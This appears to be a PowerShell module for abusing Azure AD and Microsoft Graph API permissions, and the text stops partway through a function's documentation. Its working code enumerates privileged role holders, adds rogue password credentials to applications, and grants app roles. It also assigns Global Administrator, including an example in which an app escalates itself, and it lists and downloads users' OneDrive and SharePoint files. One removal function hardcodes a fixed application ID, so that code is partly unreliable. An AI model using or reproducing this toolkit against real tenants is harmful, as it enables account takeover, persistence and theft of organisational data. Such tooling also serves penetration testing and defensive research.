<#

    (Ab)use Azure API Permissions
    Author: https://github.com/hagrid29

#>

# Obtain full list with command
# Get-AAAApplication -application -ListMSGraphAppRoles
$InterstingAppRole = @{
    "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" = "RoleManagement.ReadWrite.Directory"
    "741f803b-c850-494e-b5df-cde7c675a1ca" = "User.ReadWrite.All"
    "c529cfca-c91b-489c-af2b-d92990b66ce6" = "User.ManageIdentities.All"
    "06b708a9-e830-4db3-a914-8e69da51d44f" = "AppRoleAssignment.ReadWrite.All"
    "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9" = "Application.ReadWrite.All"
    "19dbc75e-c2e2-444c-a770-ec69d8559fc7" = "Directory.ReadWrite.All"
    "292d869f-3427-49a8-9dab-8c70152b74e9" = "Organization.ReadWrite.All"
    "29c18626-4985-4dcd-85c0-193eef327366" = "Policy.ReadWrite.AuthenticationMethod"
    "01c0a623-fc9b-48e9-b794-0756f8e8f067" = "Policy.ReadWrite.ConditionalAccess"
    "50483e42-d915-4231-9639-7fdb7fd190e5" = "UserAuthenticationMethod.ReadWrite.All"
    "810c84a8-4a9e-49e6-bf7d-12d183f40d01" = "Mail.Read"
    "e2a3a72e-5f79-4c64-b1b1-878b674786c9" = "Mail.ReadWrite"
    "6931bccd-447a-43d1-b442-00a195474933" = "MailboxSettings.ReadWrite"
    "75359482-378d-4052-8f01-80520e7db3cd" = "Files.ReadWrite.All"
    "01d4889c-1287-42c6-ac1f-5d1e02578ef6" = "Files.Read.All"
    "332a536c-c7ef-4017-ab91-336970924f0d" = "Sites.Read.All"
    "9492366f-7969-46a4-8d15-ed1a20078fff" = "Sites.ReadWrite.All"
    "0c0bf378-bf22-4481-8f81-9e89a9b4960a" = "Sites.Manage.All"
    "a82116e5-55eb-4c41-a434-62fe8a61c773" = "Sites.FullControl.All"
    "3aeca27b-ee3a-4c2b-8ded-80376e2134a4" = "Notes.Read.All"
    "0c458cef-11f3-48c2-a568-c66751c238c0" = "Notes.ReadWrite.All"
}


#https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference
$InterstingDirectoryRole = @{
    "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" = "Application Administrator"
    "158c047a-c907-4556-b7ef-446551a6b5f7" = "Cloud Application Administrator"
    "9360feb5-f418-4baa-8175-e2a00bac4301" = "Directory Writers"
    "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
    "fdd7a751-b60b-444a-984c-02652fe8fa1c" = "Groups Administrator"
    "45d8d3c5-c802-45c6-b32a-1d70b5e1e86e" = "Identity Governance Administrator"
    "8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2" = "Hybrid Identity Administrator"
    "3a2c62db-5318-420d-8d74-23affee5d9d5" = "Intune Administrator"
    "b5a8dcf3-09d5-43a9-a639-8e29ef291470" = "Knowledge Administrator"
    "4ba39ca4-527c-499a-b93d-d9b492c50246" = "Partner Tier1 Support"
    "e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8" = "Partner Tier2 Support"
    "e8611ab8-c189-46e8-94e1-60213ab1f814" = "Privileged Role Administrator"
    "fe930be7-5e62-47db-91af-98c3a49a38b1" = "User Administrator"
    "11451d60-acb2-45eb-a7d6-43d0f0125c13" = "Windows 365 Administrator"
    "c4e39bd9-1100-46d3-8c65-fb160da0071f" = "Authentication Administrator"
    "b0f54661-2d74-4c50-afa3-1ec803f12efe" = "Billing administrator"
    "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9" = "Conditional Access administrator"
    "29232cdf-9323-42fd-ade2-1d097af3e4de" = "Exchange administrator"
    "729827e3-9c14-49f7-bb1b-9608f156bbb8" = "Helpdesk administrator"
    "966707d0-3269-4727-9be2-8c3a10f19b9d" = "Password administrator"
    "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged authentication administrator"
    "194ae4cb-b126-40b2-bd5b-6091b380977d" = "Security administrator"
    "f28a1f50-f6e7-4571-818b-6a12f2af6b6c" = "SharePoint administrator"
}




function Find-AAAInterestingAppRoleAssignment {
<#
    .SYNOPSIS
    Search any interesting app role assignment

    .DESCRIPTION
    Search applications or service principles that were assigned with privileged app role

    .Parameter ServicePrinciple
    If provided, return list of service principles with interesting app role assignment

    .Parameter Application
    If provided, return list of applications with interesting app role assignment
    
    .Example
    Find-AAAInterestingAppRoleAssignment -Application
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’ServicePrinciple’)]
        [switch]$ServicePrinciple,
        [Parameter(Mandatory= $true, ParameterSetName=’Application’)]
        [switch]$Application
    ) 
    $temp = @{} # map service principle id to app id
    if($PSBoundParameters.ContainsKey('ServicePrinciple')){
        $Result = Get-AAAApplication -ServicePrinciple | % {
            Get-AAAAppRoleAssignments -AppId $_.appid; 
            $temp.add($_.id,$_.appid)
        }
    }
    elseif($PSBoundParameters.ContainsKey('Application')){
        $Result = Get-AAAApplication -Application | % {
            $a = Get-AAAAppRoleAssignments -AppId $_.appid; $a; 
            if($a.principalId -ne $null){
                $b = $a.principalId | Get-Unique;
                $temp.add($b, $_.appid)
            }
        }
        
    }    
    $Result | select principalDisplayName,principalId,appRoleId | ?{ $InterstingAppRole[$_.appRoleId] -ne $null } | Format-Table @{Label="DisplayName"; Expression={ $_.principalDisplayName }},@{Label="AppId"; Expression={ $temp[$_.principalId] }},@{Label="AppRole"; Expression={ $InterstingAppRole[$_.appRoleId] } }
}

function Find-AAAInterestingDirectoryRoleAssignment {
<#
    .SYNOPSIS
    Search any interesting directory role assignment

    .DESCRIPTION
    Search users or guests or service principles that were assigned with privileged directory role

    .Parameter ServicePrinciple
    If provided, return list of service principles with interesting directory role assignment

    .Parameter User
    If provided, return list of users with interesting directory role assignment

    .Parameter Guest
    If provided, return list of guests with interesting directory role assignment
    
    .Example
    Find-AAAInterestingDirectoryRoleAssignment -ServicePrinciple
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’ServicePrinciple’)]
        [switch]$ServicePrinciple,
        [Parameter(Mandatory= $true, ParameterSetName=’User’)]
        [switch]$User,
        [Parameter(Mandatory= $true, ParameterSetName=’Guest’)]
        [switch]$Guest
    )

    $Result = @()
    if($PSBoundParameters.ContainsKey('ServicePrinciple')){
        foreach ($i in $InterstingDirectoryRole.GetEnumerator()) { 
            $b = Get-AAADirectoryRoleMember -RoleTemplateId $i.Name -filter ServicePrinciple
            $b | ?{$_ -ne $null} | %{ $Result += [pscustomobject]@{Role = $i.Value;DisplayName = $_.displayName;AppId = $_.appId;ObjectId = $_.id} }
        }
    }
    elseif($PSBoundParameters.ContainsKey('user')){
        foreach ($i in $InterstingDirectoryRole.GetEnumerator()) { 
            $b = Get-AAADirectoryRoleMember -RoleTemplateId $i.Name -filter User
            $b | ?{$_ -ne $null} | %{ $Result += [pscustomobject]@{Role = $i.Value;DisplayName = $_.displayName;userPrincipalName = $_.userPrincipalName;ObjectId = $_.id;userType = $_.userType} }
        }
    }
    elseif($PSBoundParameters.ContainsKey('guest')){
        foreach ($i in $InterstingDirectoryRole.GetEnumerator()) { 
            $b = Get-AAADirectoryRoleMember -RoleTemplateId $i.Name -filter User
            $b | ?{$_ -ne $null} | ?{$_.userType -eq "Guest"} | %{ $Result += [pscustomobject]@{Role = $i.Value;DisplayName = $_.displayName;userPrincipalName = $_.userPrincipalName;ObjectId = $_.id;userType = $_.userType} }
        }
    }

    $Result

}

<#
    Application.Read.All, Application.ReadWrite.OwnedBy, Application.ReadWrite.All, Directory.Read.All
#>
function Get-AAAApplication {
<#
    .SYNOPSIS
    List details of applications or service principles

    .DESCRIPTION
    List details of target applications or service principles

    .Parameter ServicePrinciple
    If provided, return details of service principle

    .Parameter Application
    If provided, return details of application
    
    .Parameter AppId
    The application ID of target application

    .Parameter ServicePrincipalId
    The service principal ID of target application
    
    .Parameter ListMSGraphAppRoles
    Return a list of MS graph app roles

    .Parameter Search
    The keyword in displayname to search for a group


    .Example
    Get-AAAApplication -Application

    .Example
    Get-AAAApplication -ServicePrinciple -AppId 'XXXX'

    .Example
    Get-AAAApplication -Application -Search "citrix"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’ServicePrinciple’)]
        [switch]$ServicePrinciple,
        [Parameter(Mandatory= $true, ParameterSetName=’Application’)]
        [switch]$Application,
        [Parameter(Mandatory= $false)]
        [string]$AppId,
        [Parameter(Mandatory= $false)]
        [string]$ServicePrincipalId,
        [Parameter(Mandatory= $false)]
        [switch]$ListMSGraphAppRoles,
        [Parameter(Mandatory= $false)]
        [string]$Search
    )

    $GraphToken = Get-AAAGraphToken
    
    if($PSBoundParameters.ContainsKey('ServicePrinciple')){
        $URL = "https://graph.microsoft.com/v1.0/servicePrincipals"  
        if($AppId -ne ""){
            $URL = $URL + "(appId='{$AppId}')"
        }
        elseif($ServicePrincipalId -ne ""){
            $URL = $URL + "/$ServicePrincipalId"
        }
    }
    elseif($PSBoundParameters.ContainsKey('Application')){
        $URL = "https://graph.microsoft.com/v1.0/applications"
        if($AppId -ne ""){
            $URL = $URL + "?`$filter=appId eq '$AppId'"
        }  
    }


    if($Search -ne ""){
        $URL = $URL + "?`$search=`"displayName:$Search`""
    }
    elseif($AppId -eq "" -AND $ServicePrincipalId -eq ""){
        
        $TotalCount = Get-AAATotalCount -URL $URL -GraphToken $GraphToken
        
        if($TotalCount -gt 1000){
            Write-Host "Total $TotalCount results. More than maximum limit 999. Only top 999 result returned"
            $TotalCount = 999
        }

        $URL = $URL + "?`$top=$TotalCount"
    }


    if($PSBoundParameters.ContainsKey('ListMSGraphAppRoles')){
        $URL = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'&`$select=appRoles, oauth2PermissionScopes"  
    }

    $Params = @{ 
     "URI" = $URL 
     "Method" = "GET" 
     "Headers" = @{
        "User-Agent" = Get-AAAUserAgent 
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
        "consistencylevel"= "eventual"
     } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing

    if($Result.PSobject.Properties.name -match "value"){
        $Result.value
    }
    else{
        $Result
    }
 
}



<#
    Application.Read.All, Application.ReadWrite.OwnedBy, Application.ReadWrite.All, Directory.Read.All, Directory.ReadWrite.All
#>
function Get-AAAApplicationOwner {
<#
    .SYNOPSIS
    List details of owner of target applications or service principles

    .DESCRIPTION
        List details of owner of target applications or service principles

    .Parameter ServicePrinciple
    If provided, return details of owner of service principle

    .Parameter Application
    If provided, return details of owner of application
    
    .Parameter AppId
    The application ID of target application
    
    .Example
    Get-AAAApplicationOwner -Application -AppId 'XXXX'
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’ServicePrinciple’)]
        [switch]$ServicePrinciple,
        [Parameter(Mandatory= $true, ParameterSetName=’Application’)]
        [switch]$Application,
        [Parameter(Mandatory= $true)]
        [string]$AppId
    )


    $GraphToken = Get-AAAGraphToken
    
    if($PSBoundParameters.ContainsKey('ServicePrinciple')){
        $URL = "https://graph.microsoft.com/v1.0/servicePrincipals(appId='{$AppId}')/owners"  
        
    }
    elseif($PSBoundParameters.ContainsKey('Application')){
        $AppObjectId = (Get-AAAApplication -Application -AppId $AppId).id
        $URL = "https://graph.microsoft.com/v1.0/applications/$AppObjectId/owners"
       
    }

    $Params = @{ 
     "URI" = $URL 
     "Method" = "GET" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
        "consistencylevel"= "eventual"
     } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing
    $Result.value
    
}

function Get-AAAAppPassword {
<#
    .SYNOPSIS
    List details of password credentials

    .DESCRIPTION
    List details of password credentials assigned to target application

    .Parameter ServicePrinciple
    If provided, return details of password credentials of service principle

    .Parameter Application
    If provided, return details of password credentials of application
    
    .Parameter AppId
    The application ID of target application
    
    .Example
    Get-AAAAppPassword -Application -AppId 'XXXX'
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’ServicePrinciple’)]
        [switch]$ServicePrinciple,
        [Parameter(Mandatory= $true, ParameterSetName=’Application’)]
        [switch]$Application,
        [Parameter(Mandatory= $true)]
        [string]$AppId
    )

    if($PSBoundParameters.ContainsKey('ServicePrinciple')){
        $Result = Get-AAAApplication -ServicePrinciple -AppId $AppId
    }
    elseif($PSBoundParameters.ContainsKey('Application')){
        $Result = Get-AAAApplication -Application -AppId $AppId
    }
    
    $Result.passwordCredentials

}

<#
    Application.ReadWrite.OwnedBy (apply to owned application), Application.ReadWrite.All
#>
function New-AAAAppPassword {
<#
    .SYNOPSIS
    Add password credential for application

    .DESCRIPTION
    Add password credential for application

    .Parameter ServicePrinciple
    If provided, add password credential for target service principle

    .Parameter Application
    If provided, add password credential for target service principle
    
    .Parameter AppId
    The application ID of target application
    
    .Example
    New-AAAAppPassword -ServicePrinciple -AppId 'XXXX'
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’ServicePrinciple’)]
        [switch]$ServicePrinciple,
        [Parameter(Mandatory= $true, ParameterSetName=’Application’)]
        [switch]$Application,
        [Parameter(Mandatory= $true)]
        [string]$AppId,
        [Parameter(Mandatory= $false)]
        [string]$DisplayName
    )

    if($PSBoundParameters.ContainsKey('ServicePrinciple')){
        $URL = "https://graph.microsoft.com/v1.0/servicePrincipals(appId='{$AppId}')/addPassword"  
    }
    elseif($PSBoundParameters.ContainsKey('Application')){
        $AppObjectId = (Get-AAAApplication -Application -AppId $AppId).id
        $URL = "https://graph.microsoft.com/v1.0/applications/$AppObjectId/addPassword"  
    }

    $GraphToken = Get-AAAGraphToken
    $Params = @{ 
     "URI" = $URL 
     "Method" = "POST" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
     "Body" = @{
        passwordCredential = @{
            displayName = $DisplayName
        }
     } | ConvertTo-Json
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing
    $Result

}

<#
    Application.ReadWrite.OwnedBy (apply to owned application), Application.ReadWrite.All
#>
function Remove-AAAAppPassword {
<#
    .SYNOPSIS
    Remove password credential for application

    .DESCRIPTION
    Remove password credential for application

    .Parameter ServicePrinciple
    If provided, remove password credential for target service principle

    .Parameter Application
    If provided, remove password credential for target service principle
    
    .Parameter AppId
    The application ID of target application
    
    .Parameter keyId
    The password credential ID of target application

    .Example
    Remove-AAAAppPassword -ServicePrinciple -AppId 'XXXX' -KeyId 'XXXX'
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’ServicePrinciple’)]
        [switch]$ServicePrinciple,
        [Parameter(Mandatory= $true, ParameterSetName=’Application’)]
        [switch]$Application,
        [Parameter(Mandatory= $true)]
        [string]$AppId,
        [Parameter(Mandatory= $true)]
        [string]$keyId
    )

    if($PSBoundParameters.ContainsKey('ServicePrinciple')){
        $URL = "https://graph.microsoft.com/v1.0/servicePrincipals(appId='{$AppId}')/removePassword"  
    }
    elseif($PSBoundParameters.ContainsKey('Application')){
        $AppObjectId = (Get-AAAApplication -Application -AppId "9a866ae6-dfdb-40cf-8e34-b69c06917480").id
        $URL = "https://graph.microsoft.com/v1.0/applications/$AppObjectId/removePassword"  
    }

    $GraphToken = Get-AAAGraphToken
    $Params = @{ 
     "URI" = $URL 
     "Method" = "POST" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
     "Body" = @{
        keyId = $keyId
     } | ConvertTo-Json
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing
    Write-Output "Password removed"

}

<#
    Application.Read.All, Application.ReadWrite.OwnedBy, Directory.Read.All, Application.ReadWrite.All, Directory.ReadWrite.All
#>
function Get-AAAAppRoleAssignments {
<#
    .SYNOPSIS
    List details of application role assignments of target service principle

    .DESCRIPTION
    List details of application role assignments of target service principle
    
    .Parameter AppId
    The application ID of target service principle

    .Parameter Readable
    Convert application role ID to readable value by first extracting a list of ID and value pairs from Graph API
    
    .Example
    Get-AAAAppRoleAssignments -AppId 'XXXX' -Readable
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$AppId,
        [Parameter(Mandatory= $false)]
        [switch]$Readable
    )

    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/servicePrincipals(appId='{$AppId}')/appRoleAssignments"  
    $Params = @{ 
     "URI" = $URL 
     "Method" = "GET" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing
    
    if($PSBoundParameters.ContainsKey('Readable')){
        $MSGraphAppRolesList = (Get-AAAApplication -ListMSGraphAppRoles -ServicePrinciple).appRoles
        $MSGraphAppRolesPair = @{}
        $MSGraphAppRolesList | %{$MSGraphAppRolesPair.Add($_.id, $_.value)}
        $Result.value | select appRoleId,resourceDisplayName,id | Format-Table @{Label="AppRole"; Expression={ if($MSGraphAppRolesPair[$_.appRoleId] -ne $null){$MSGraphAppRolesPair[$_.appRoleId]}else{$_.appRoleId}}},resourceDisplayName,@{Label="AssignId"; Expression={$_.id}}
    }else{
        $Result.value
    }
}


<#
    AppRoleAssignment.ReadWrite.All and Application.Read.All, AppRoleAssignment.ReadWrite.All and Directory.Read.All
#>
function Set-AAAAppRoleAssignments {
<#
    .SYNOPSIS
    Assign application role to target service principle

    .DESCRIPTION
    Assign application role to target service principle

    .Parameter AppId
    The application ID of assigned service principle

    .Parameter TargetObjectId
    The object ID of assigned user, group, or client service principal. Default value set to object ID of application of parameter "appId"
    
    .Parameter AppRoleId
    The application role ID that would be assigned

    .Parameter ResourceIdId
    The object ID of resource service principle. Default value set to object ID of service principle "Microsoft Graph"
    
    .Example
    # Assign "Sites.ReadWrite.All" to specific application to access all SharePoint Sites and One Drive of users
    Set-AAAAppRoleAssignments -AppId 'XXXX' -AppRoleId "9492366f-7969-46a4-8d15-ed1a20078fff"

    .Example
    # Assign "RoleManagement.ReadWrite.Directory" to specific application and assign Global Admin role to itself
    $CurrentAppId = "XXXX"
    $CurrentObjectId = "XXXX"
    Set-AAAAppRoleAssignments -AppId $CurrentAppId -AppRoleId "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"
    Set-AAADirectoryRoleMember -RoleTemplateId "62e90394-69f5-4237-9190-012177145e10" -TargetObjectId $CurrentObjectId

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$AppId,
        [Parameter(Mandatory= $true)]
        [string]$AppRoleId,
        [Parameter(Mandatory= $false)]
        [string]$TargetObjectId,
        [Parameter(Mandatory= $false)]
        [string]$ResourceId

    )

    $GraphToken = Get-AAAGraphToken

    if($TargetObjectId -eq ""){
        $TargetObjectId = (Get-AAAApplication -ServicePrinciple -AppId $AppId).id
    }

    if($ResourceId -eq ""){
        $ResourceId = (Get-AAAApplication -ServicePrinciple | ?{$_.displayName -eq "Microsoft Graph" }).id
    }


    $URL = "https://graph.microsoft.com/v1.0/servicePrincipals(appId='{$AppId}')/appRoleAssignedTo"  
    $Params = @{ 
     "URI" = $URL 
     "Method" = "POST" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
     "Body" = @{
        principalId = $TargetObjectId 
        resourceId = $ResourceId  
        appRoleId =  $AppRoleId
        startTime = Get-Date -Format "yyyy-MM-ddT00:00:00Z"  
        expiryTime = Get-date (Get-date).AddDays(14) -Format "yyyy-MM-ddT00:00:00Z"
     } | ConvertTo-Json
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing

    Write-Output "App role assigned"

}


<#
    AppRoleAssignment.ReadWrite.All
#>
function Remove-AAAAppRoleAssignments {
<#
    .SYNOPSIS
    Remove application role from target service principle

    .DESCRIPTION
    Remove application role from target service principle

    .Parameter AppId
    The application ID of service principle that assign application role
    
    .Parameter AssignId
    The ID of assignment of app role

    .Example
    Remove-AAAAppRoleAssignments -AppId "XXXX" -AssignId "XXXX"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$AppId,
        [Parameter(Mandatory= $true)]
        [string]$AssignId
    )

    $GraphToken = Get-AAAGraphToken
    $URL = "https://graph.microsoft.com/v1.0/servicePrincipals(appId='{$AppId}')/appRoleAssignedTo/$AssignId"  
    $Params = @{ 
     "URI" = $URL 
     "Method" = "DELETE" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing

    Write-Output "App role assignment removed"

}


<#
    RoleManagement.Read.Directory, Directory.Read.All, RoleManagement.ReadWrite.Directory, Directory.ReadWrite.All
#>
function Get-AAADirectoryRoleMember {
<#
    .SYNOPSIS
    List details of member of target service directory role

    .DESCRIPTION
    List details of member of target service directory role
    
    .Parameter RoleTemplateId
    The target role template ID

    .Parameter filter
    Return members that are user or service principle
    
    .Example
    Get-AAADirectoryRoleMember -RoleTemplateId "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" -filter ServicePrinciple
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$RoleTemplateId,
        [Parameter(Mandatory= $false)]
        [ValidateSet("User", "ServicePrinciple")]
        [string]$filter
    )

    $GraphToken = Get-AAAGraphToken
    $URL = "https://graph.microsoft.com/beta/directoryRoles(roleTemplateId='{$RoleTemplateId}')/members"  
    $Params = @{ 
     "URI" = $URL
     "Method" = "GET" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     }
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    if($filter -Match "User"){
        $Result.value | ?{$_.userType -ne $null} | select displayName,userPrincipalName,id,userType
    }
    elseif($filter -Match "ServicePrinciple"){
        $Result.value | ?{$_.servicePrincipalType -ne $null} | select displayName,appId,id
    }
    else{
        $Result.value
    }

}


<#
    RoleManagement.ReadWrite.Directory
#>
function Set-AAADirectoryRoleMember {
<#
    .SYNOPSIS
    Assign directory role to target object

    .DESCRIPTION
    Assign directory role to target object like user, service principle

    .Parameter RoleTemplateId
    The directory role role ID that would be assigned

    .Parameter TargetObjectId
    The object ID of assigned user, group or service principle

    .Example
    Set-AAADirectoryRoleMember -RoleTemplateId "62e90394-69f5-4237-9190-012177145e10" -TargetObjectId "XXXX"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$RoleTemplateId,
        [Parameter(Mandatory= $true)]
        [string]$TargetObjectId
    )

    $GraphToken = Get-AAAGraphToken
    $URL = "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId={$RoleTemplateId}/members/`$ref"  
    $Params = @{ 
     "URI" = $URL 
     "Method" = "POST" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
     "Body" = @{
        "@odata.id"= "https://graph.microsoft.com/v1.0/directoryObjects/$TargetObjectId" 
     } | ConvertTo-Json
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing

    Write-Output "Role member assigned"

}

<#
    RoleManagement.ReadWrite.Directory
#>
function Remove-AAADirectoryRoleMember {
<#
    .SYNOPSIS
    Remove directory role assignment of target object

    .DESCRIPTION
    Remove directory role assignment of target object like user, service principle

    .Parameter RoleTemplateId
    The directory role role ID that would be assigned

    .Parameter TargetObjectId
    The object ID of assigned user, group or service principle

    .Example
    Remove-AAADirectoryRoleMember -RoleTemplateId "62e90394-69f5-4237-9190-012177145e10" -TargetObjectId "XXXX"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$RoleTemplateId,
        [Parameter(Mandatory= $true)]
        [string]$TargetObjectId
    )

    $GraphToken = Get-AAAGraphToken
    $URL = "https://graph.microsoft.com/v1.0/directoryRoles(roleTemplateId='{$RoleTemplateId}')/members/$TargetObjectId/`$ref"  
    $Params = @{ 
     "URI" = $URL 
     "Method" = "DELETE" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing

    Write-Output "Role member removed"

}

<#
    Sites.Read.All, Sites.ReadWrite.All, Sites.Manage.All, Sites.FullControl.All
#>
function Get-AAASites {
<#
    .SYNOPSIS
    Obtain a list of avaible SharePoint sites

    .DESCRIPTION
    Obtain a list of avaible SharePoint sites

    .Example
    Get-AAASites
#>
    $GraphToken = Get-AAAGraphToken
    $URL = "https://graph.microsoft.com/v1.0/sites"  
    $Params = @{ 
     "URI" = $URL 
     "Method" = "GET" 
     "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
     } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing
    $Result.value | select name,id,webUrl | Format-Table name,webUrl,@{Label="SiteId"; Expression={ $_.id.Split(",")[1]}}
}

<#
    Files.Read.All, Files.ReadWrite.All, Sites.Read.All, Sites.ReadWrite.All, Sites.Manage.All, Sites.FullControl.All
#>
function Get-AAAOneDriveFolder {
<#
    .SYNOPSIS
    List detail of items in a SharePoint site or One Drive folder

    .DESCRIPTION
    List detail of items in a SharePoint site or One Drive folder    

    .Parameter UserId
    If provided, list detail of items in a One Drive with specified UserId (user principle name or user object ID). Default list items in root directory

    .Parameter SiteId
    If provided, list detail of items in a SharePoint site with specified SiteId. Default list items in root directory

    .Parameter FolderId
    If provided, list detail of items in a folder with specified FolderId

    .Parameter Parent
    If provided, list detail of items in the parent folder of a folder with speficied FolderId

    .Parameter Child
    If provided, list detail of child items of a folder with speficied FolderId

    .Parameter showDetails
    If provided, list details including file type, parent info, createdBy, lastModifiedBy, webUrl of items

    .Parameter recurse
    If provided, list details of items in a folder with specified FolderId recursively

    .Example
    Get-AAAOneDriveFolder -SitetId "XXXX"

    .Example
    Get-AAAOneDriveFolder -UserId "hagrid29@XXX.onmicrosoft.com"
    Get-AAAOneDriveFolder -UserId "hagrid29@XXX.onmicrosoft.com" -FolderId "XXXX" -showDetails
    Get-AAAOneDriveFolder -UserId "hagrid29@XXX.onmicrosoft.com" -FolderId "XXXX" -recurse | Export-CSV -Encoding UFT8 Result.csv
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$UserId,
        [Parameter(Mandatory= $false)]
        [string]$SiteId,
        [Parameter(Mandatory= $false)]
        [string]$FolderId,
        [Parameter(Mandatory= $false)]
        [switch]$Parent,
        [Parameter(Mandatory= $false)]
        [switch]$Child,
        [Parameter(Mandatory= $false)]
        [switch]$showDetails,
        [Parameter(Mandatory= $false)]
        [switch]$recurse

    )
	
    $GraphToken = Get-AAAGraphToken

    if($UserId -eq ""){
        $URL = "https://graph.microsoft.com/v1.0/sites/$SiteId/"
    }
    else{
        $URL = "https://graph.microsoft.com/v1.0/users/$UserId/"
    }

    
    if($FolderId -eq ""){
        $URL += "drive/root" 
    }
    else{
        $URL+= "drive/items/$FolderId" 
    }

    if(-NOT $PSBoundParameters.ContainsKey('Parent')){
        $URL += "/children"
    }
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 
    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    
    if($PSBoundParameters.ContainsKey('Parent')){
        Get-AAAOneDriveFolder -UserId $UserId -SitetId $SitetId -FolderId $Result.parentReference.id -showDetails
    }
    elseif($PSBoundParameters.ContainsKey('recurse')){
        $Result.value
        $Result.value | ?{$_.folder -OR $_.package.type -eq "oneNote"} | %{Get-AAAOneDriveFolder -UserId $UserId -SitetId $SitetId -FolderId $_.id -recurse}
    }
    elseif($PSBoundParameters.ContainsKey('showDetails')){
        $Result.value | select id,name,lastModifiedDateTime,size,folder,package,file,parentReference,createdBy,lastModifiedBy,webUrl | Format-List id,name,lastModifiedDateTime,size,folder,@{Label="packageType"; Expression={$_.package.type}},@{Label="fileType"; Expression={$_.file.mimeType}},@{Label="parent"; Expression={"path="+$_.parentReference.path;"id="+$_.parentReference.id}},@{Label="createdBy"; Expression={$_.createdBy.user.email}},@{Label="lastModifiedBy"; Expression={$_.lastModifiedBy.user.email}},webUrl
    }
    else{
        $Result.value | select id,name,lastModifiedDateTime,size,folder | Format-List id,name,lastModifiedDateTime,size,folder
    }
    
}

<#
    Files.Read.All, Files.ReadWrite.All, Sites.Read.All, Sites.ReadWrite.All, Sites.FullControl.All, Sites.Manage.All
#>
function Get-AAAOneDriveFile {
<#
    .SYNOPSIS
    List details of or download item from a SharePoint site or One Drive

    .DESCRIPTION
    List details of or download item from a SharePoint site or One Drive

    .Parameter UserId
    If provided, return the item from a One Drive with specified UserId (user principle name or user object ID)

    .Parameter SiteId
    If provided, return the item from a SharePoint site with specified SiteId

    .Parameter FileId
    File ID of the file that would be downloaded
    
    .Parameter Download
    If provided, download the item

    .Parameter OutFile
    File name of output

    .Example
    Get-AAAOneDriveFolder -UserId "XXXX" -FileId "XXXX" -Download

#>
